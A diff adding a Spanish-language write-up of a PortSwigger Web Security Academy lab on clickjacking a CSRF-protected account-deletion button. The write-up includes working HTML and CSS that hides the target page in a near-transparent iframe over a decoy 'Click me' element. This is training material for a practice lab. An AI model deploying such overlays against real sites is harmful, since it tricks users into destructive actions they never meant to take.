@@ -402,6 +402,32 @@ javascript:alert("1337")
 
 ## [Clickjacking](https://portswigger.net/web-security/clickjacking)
 
+### [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)
+
+Este laboratorio contiene un botón para eliminar la cuenta el cual está protegido por un token CSRF. La intención es hacer que un usuario haga click en un iframe con opacidad baja para que elimine su cuenta.
+
+Para resolver este laboratorio, después de autenticarse con las credenciales provistas, dirigirse a Account Actions, y tomando esta url, la ponemos en el src del siguiente iframe.
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 370px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://ac411f041eabd7098042860e00170056.web-security-academy.net/account"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
